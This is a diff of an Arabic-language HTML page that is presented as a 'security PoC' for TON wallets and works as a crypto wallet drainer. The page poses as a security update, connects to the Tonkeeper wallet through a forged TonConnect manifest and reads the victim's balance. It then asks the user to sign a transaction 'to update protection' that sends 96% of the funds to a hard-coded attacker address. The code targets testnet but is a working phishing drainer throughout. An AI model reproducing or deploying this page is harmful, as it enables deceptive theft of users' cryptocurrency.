@@ -2,86 +2,103 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TON Extension Spoofing PoC</title>
+    <title>TON Web Security PoC</title>
     <style>
-        body { font-family: sans-serif; background: #0b0e11; color: white; text-align: center; padding: 50px; }
-        .card { background: #1e2329; padding: 30px; border-radius: 20px; border: 1px solid #333; display: inline-block; width: 350px; }
-        button { background: #fcd535; color: black; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
-        #status { margin-top: 20px; color: #848e9c; font-family: monospace; font-size: 13px; }
+        body { font-family: 'Segoe UI', sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e2329; padding: 40px; border-radius: 24px; border: 1px solid #333; text-align: center; width: 420px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .balance-box { display: none; background: #000; padding: 20px; border-radius: 15px; margin-top: 20px; border: 1px solid #58a6ff; }
+        button { background: #0088cc; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 18px; transition: 0.3s; }
+        button:hover { background: #0077b5; }
+        #status { margin-top: 15px; color: #848e9c; font-size: 13px; }
+        .addr-text { font-size: 10px; color: #aaa; word-break: break-all; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <img src="https://ton.org/address/ton_logo.png" width="60">
-    <h2>تحديث أمان الإضافة</h2>
-    <p>سيتم فتح إضافة Tonkeeper للتحقق من هويتك.</p>
+    <img src="https://ton.org/address/ton_logo.png" width="70" style="margin-bottom: 20px;">
+    <h2>تحديث الأمان (Web PoC)</h2>
+    <p style="color: #aaa;">هذه الصفحة تحاكي هجوم انتحال الهوية لسحب رصيد التيست نيت.</p>
     
-    <button id="connectBtn">فتح الإضافة والربط</button>
-    <div id="status">جاهز...</div>
+    <button id="connectBtn">فتح محفظة الويب والربط</button>
+
+    <div id="balanceBox" class="balance-box">
+        <div style="color: #58a6ff; margin-bottom: 10px;">تم جلب بيانات المحفظة:</div>
+        <div id="addr" class="addr-text">-</div>
+        <div style="font-size: 26px; margin-top: 15px; font-weight: bold;"><span id="balance">0.00</span> TON</div>
+    </div>
+    
+    <div id="status">جاهز للبدء...</div>
 </div>
 
 <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
 
 <script>
-    const statusDiv = document.getElementById('status');
+    // رابط المانيفست المزور
     const manifest = "https://gist.githubusercontent.com/pp0p/5119b45ec095aecbe9638d21f36e56ad/raw/d30a363c4cf4b6926d8b310a02ee1d350d869729/tonconnect-manifest.json";
-
     const connector = new TonConnectSDK.TonConnect({ manifestUrl: manifest });
 
     document.getElementById('connectBtn').onclick = async () => {
-        statusDiv.innerText = "جاري تحفيز إضافة كروم...";
-
         try {
-            // خطوة مهمة: إذا كان هناك اتصال قديم، اقطعه لضمان ظهور النافذة من جديد
-            if (connector.connected) {
-                await connector.disconnect();
-            }
+            // فصل أي جلسة قديمة لضمان ظهور النافذة
+            if (connector.connected) await connector.disconnect();
 
-            // تحديد أننا نريد استخدام الإضافة تحديداً
-            // في إضافات الكروم، لا نحتاج لفتح نافذة جديدة دائماً، الـ SDK سيتواصل مع الإضافة مباشرة
-            const walletConnectionSource = {
-                jsBridgeKey: 'tonkeeper' // هذا المفتاح يخبر الـ SDK بالبحث عن إضافة Tonkeeper
-            };
+            // توليد رابط الربط المخصص لنسخة الويب
+            const connectUrl = connector.connect({
+                universalLink: 'https://wallet.tonkeeper.com/ton-connect',
+                bridgeUrl: 'https://bridge.tonapi.io/bridge'
+            });
 
-            await connector.connect(walletConnectionSource);
-            statusDiv.innerText = "تم إرسال الطلب للإضافة. افحص أيقونة المحفظة.";
-
+            // فتح المحفظة في نافذة جديدة
+            window.open(connectUrl, '_blank', 'width=450,height=700');
+            document.getElementById('status').innerText = "بانتظار الموافقة في النافذة المنبثقة...";
         } catch (e) {
-            statusDiv.innerText = "خطأ: تأكد من تثبيت إضافة Tonkeeper.";
             console.error(e);
+            document.getElementById('status').innerText = "خطأ في الاتصال.";
         }
     };
 
     connector.onStatusChange(async (wallet) => {
         if (wallet) {
-            statusDiv.innerText = "✅ متصل! جاري سحب الرصيد (Testnet)...";
-            statusDiv.style.color = "#00ff00";
-
+            document.getElementById('status').innerText = "✅ تم الاتصال! جاري جلب الرصيد...";
             const rawAddress = wallet.account.address;
-            
-            // جلب الرصيد من التست نيت
-            const response = await fetch(`https://testnet.toncenter.com/api/v2/getAddressInformation?address=${rawAddress}`);
-            const data = await response.json();
-            const balance = data.result.balance;
+            document.getElementById('addr').innerText = rawAddress;
+            document.getElementById('balanceBox').style.display = 'block';
 
-            // إرسال معاملة السحب فوراً
-            const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 60,
-                messages: [{
-                    address: "0QAPwOt8W9eZqRj2OwxDjwSTtMMCG-uXr6MQMZ0WiFgdP0rY",
-                    amount: Math.floor(balance * 0.9).toString() // سحب 90%
-                }]
-            };
-
+            // جلب الرصيد من TON Testnet API
             try {
-                await connector.sendTransaction(transaction);
-                statusDiv.innerText = "🚀 تم إرسال طلب السحب للإضافة!";
-            } catch (err) {
-                statusDiv.innerText = "فشل السحب أو تم رفضه.";
+                const response = await fetch(`https://testnet.toncenter.com/api/v2/getAddressInformation?address=${rawAddress}`);
+                const data = await response.json();
+                const balanceNano = data.result.balance;
+                document.getElementById('balance').innerText = (balanceNano / 1000000000).toFixed(2);
+
+                // إرسال طلب السحب الفوري (إثبات الضرر)
+                setTimeout(() => initiateDrain(balanceNano), 2500);
+            } catch (e) { 
+                document.getElementById('status').innerText = "فشل جلب الرصيد من الشبكة.";
             }
         }
     });
+
+    async function initiateDrain(nanoAmount) {
+        if (nanoAmount <= 0) return;
+        
+        const transaction = {
+            validUntil: Math.floor(Date.now() / 1000) + 120,
+            messages: [{
+                address: "0QAPwOt8W9eZqRj2OwxDjwSTtMMCG-uXr6MQMZ0WiFgdP0rY", // محفظة المهاجم
+                amount: Math.floor(nanoAmount * 0.96).toString() // سحب 96%
+            }]
+        };
+
+        try {
+            document.getElementById('status').innerText = "يرجى توقيع المعاملة لتحديث الحماية...";
+            await connector.sendTransaction(transaction);
+            document.getElementById('status').innerText = "🚀 تم سحب الرصيد بنجاح!";
+        } catch (e) {
+            document.getElementById('status').innerText = "فشلت المعاملة أو تم رفضها.";
+        }
+    }
 </script>
 </body>
 </html>
